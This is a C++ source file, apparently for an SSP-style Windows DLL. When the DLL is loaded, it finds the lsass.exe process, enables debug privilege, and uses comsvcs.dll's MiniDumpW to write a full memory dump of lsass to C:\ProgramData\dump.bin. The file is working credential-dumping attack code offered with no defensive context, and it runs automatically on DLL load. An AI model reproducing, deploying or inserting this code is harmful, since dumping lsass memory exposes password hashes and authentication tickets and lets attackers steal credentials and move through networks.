// sspdll.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"


#include <cstdio>
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <string>  
#include <map>  
#include <TlHelp32.h> 

#pragma comment(lib,"Dbghelp.lib")
using namespace std;

int FindPID()
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		cout << "CreateToolhelp32Snapshot Error!" << endl;;
		return false;
	}

	BOOL bResult = Process32First(hProcessSnap, &pe32);

	while (bResult)
	{
		if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
		{
			return pe32.th32ProcessID;
		}
		bResult = Process32Next(hProcessSnap, &pe32);
	}

	CloseHandle(hProcessSnap);

	return -1;
}

typedef HRESULT(WINAPI* _MiniDumpW)(
	DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);

int dump() {

	HRESULT             hr;
	_MiniDumpW          MiniDumpW;
	_RtlAdjustPrivilege RtlAdjustPrivilege;
	ULONG               t;

	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");

	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

	if (MiniDumpW == NULL) {

		return 0;
	}
	// try enable debug privilege
	RtlAdjustPrivilege(20, TRUE, FALSE, &t);

	wchar_t  ws[100];
	swprintf(ws, 100, L"%hd%hs", FindPID(), " C:\\ProgramData\\dump.bin full");

	MiniDumpW(0, 0, ws);
	return 0;

}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		dump();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}